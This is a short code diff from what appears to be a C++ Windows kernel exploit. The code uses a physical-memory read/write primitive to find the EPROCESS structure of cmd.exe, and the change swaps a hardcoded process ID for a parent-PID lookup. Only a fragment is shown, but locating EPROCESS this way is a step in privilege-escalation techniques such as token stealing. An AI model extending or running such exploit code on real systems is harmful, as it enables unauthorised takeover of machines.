@@ -6,9 +6,9 @@
 #include <string.h>
 #include <vector>
 
+
 #include "rw_primitive.h"
 #include "windows_helper_functions.h"
-
 
 
 void printBytes(void* ptr, int size)
@@ -95,7 +95,7 @@ int main(int argc, char** argv)
 
 	std::vector <unsigned __int64> EPROCESS_cmd;
 
-	if (GetEPROCESSPhysicalBase("cmd.exe", 1644, hPhysicalMemory, EPROCESS_cmd) == -1)
+	if (GetEPROCESSPhysicalBase("cmd.exe", GetPartentPid(), hPhysicalMemory, EPROCESS_cmd) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
